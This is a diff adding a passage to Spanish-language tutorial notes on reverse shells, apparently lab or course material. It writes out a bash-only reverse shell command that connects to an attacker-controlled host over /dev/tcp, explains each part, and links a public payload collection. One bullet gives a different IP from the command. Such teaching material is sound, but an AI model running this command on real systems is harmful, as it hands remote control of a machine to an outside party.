@@ -161,3 +161,21 @@ En la máquina atancante:
 - Comenzamos la explotación:
   ![](capturas/shell-reversa-socat-mv-atacante-2.png)
 
+
+#### Página dedicada a las shell reversas: PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+
+### 1.5 Shell reversa usando sólo bash, sin herramientas de red
+La opcion -c indica en el comando bash que ejecute como comando el parámetro pasado en formato cadena. Es por ello que se debe encerrar entre comillas:
+```
+bash -c "bash -i >& /dev/tcp/192.168.1.103/9000 0>&1"
+```
+El comando bash -c "bash -i >& /dev/tcp/192.168.1.103/9000 0>&1" es un ejemplo de cómo crear una shell reversa utilizando únicamente bash, sin necesidad de herramientas de red adicionales como netcat o socat. Este comando intenta abrir una conexión inversa desde el sistema atacado hacia un servidor controlado por el atacante (192.168.1.103 en el puerto 9000). Veamos en detalle cómo funciona:
+- bash -c: Este prefijo le dice a Bash que ejecute el comando especificado en las comillas siguientes como una cadena de comandos.
+- "bash -i": Ejecuta una nueva instancia de Bash en modo interactivo (-i). El modo interactivo permite al usuario interactuar con la shell, lo que es esencial para una shell reversa funcional.
+- >& /dev/tcp/10.0.1.7/9000: Redirige el stdout (salida estándar) de la shell Bash hacia una conexión TCP al host 192.168.1.103 en el puerto 9000. La funcionalidad de /dev/tcp/host/port es una característica especial de Bash que permite abrir una conexión TCP a un host y puerto especificados. No es una parte real del sistema de archivos, sino más bien una característica integrada en Bash para manipular conexiones de red.
+- 0>&1: Redirige el stdin (entrada estándar) para que también vaya a través de la misma conexión. Esto significa que cualquier entrada del lado del servidor (el atacante) se reenvía al stdin de la shell, permitiendo al atacante enviar comandos a la máquina objetivo.
+
+En resumen, este comando inicia una nueva instancia de Bash que redirige su entrada y salida a través de una conexión TCP a 192.168.1.103 en el puerto 9000, permitiendo así al atacante interactuar con la shell del sistema objetivo. Para que este ataque funcione, el atacante debe tener un servidor escuchando en el puerto 9000, esperando la conexión entrante.
+
